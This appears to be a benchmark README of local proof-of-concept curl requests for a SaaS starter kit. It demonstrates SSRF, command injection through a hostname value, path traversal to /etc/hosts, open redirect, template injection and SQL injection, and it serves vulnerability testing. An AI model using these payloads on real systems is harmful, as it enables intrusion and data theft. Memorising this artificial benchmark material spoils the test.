# SaaS Starter Kit VulnBench POCs

These checks are local-only and use harmless payloads. Start the web app and
web API using the repository's normal Docker/Postgres/Redis setup first. The
authenticated routes below use `<session-cookie>` or `<access-token>` as
placeholders for a local test account.

## Account branding logo preview (SSRF)

In another terminal, start a local server:

```sh
mkdir -p /tmp/saas-starter-logo
printf '<svg xmlns="http://www.w3.org/2000/svg"><text>SSRF_LOCAL_LOGO_MARKER</text></svg>' \
  > /tmp/saas-starter-logo/logo.svg
python3 -m http.server 9001 --bind 127.0.0.1 --directory /tmp/saas-starter-logo
```

Then ask the authenticated account-branding flow to fetch it from the server
side:

```sh
curl -G 'http://127.0.0.1:3000/account/branding/logo-preview' \
  -b 'session=<session-cookie>' \
  --data-urlencode 'logo_url=http://127.0.0.1:9001/logo.svg'
```

The JSON response contains a base64 data URL for the fetched logo. Decode its
`data_url` value and verify that it contains `SSRF_LOCAL_LOGO_MARKER`.

## Integration DNS check (command injection)

The normal hostname input can break out of the quoted lookup command. This
only runs `id`:

```sh
curl -G 'http://127.0.0.1:3000/integrations/dns-check' \
  -b 'session=<session-cookie>' \
  --data-urlencode 'hostname=localhost"; id; #'
```

## Account report download (path traversal)

The benign report is available inside the configured static directory:

```sh
curl 'http://127.0.0.1:3000/account/reports/download?name=account-summary.txt' \
  -b 'session=<session-cookie>'
```

The same report name is not confined to the exports directory:

```sh
curl -G 'http://127.0.0.1:3000/account/reports/download' \
  -b 'session=<session-cookie>' \
  --data-urlencode "name=$(printf '../%.0s' {1..20})etc/hosts"
```

## Login return-to (open redirect)

The login flow restores a requested page after authentication. Use a local
test account created through the normal signup flow:

```sh
curl -sS -D - -o /dev/null \
  -c /tmp/saas-starter-session.txt \
  -X POST 'http://127.0.0.1:3000/user/login?redirect=https%3A%2F%2Fexample.com%2F' \
  --data-urlencode 'email=<local-test-email>' \
  --data-urlencode 'password=<local-test-password>'
```

The authenticated response's `Location` header points to the external
destination.

## Notification preview (server-side template injection)

The preview evaluates template directives supplied in the request:

```sh
curl -G 'http://127.0.0.1:3000/integrations/notification-preview' \
  -b 'session=<session-cookie>' \
  --data-urlencode 'template=<p>{{ .AccountName }}</p>' \
  --data-urlencode 'account=local-demo'
```

## Checklist search (SQL injection)

The API search endpoint requires a local access token:

```sh
curl -G 'http://127.0.0.1:3001/v1/checklists/search' \
  -H 'Authorization: Bearer <access-token>' \
  --data-urlencode "query=' OR 1=1 -- "
```
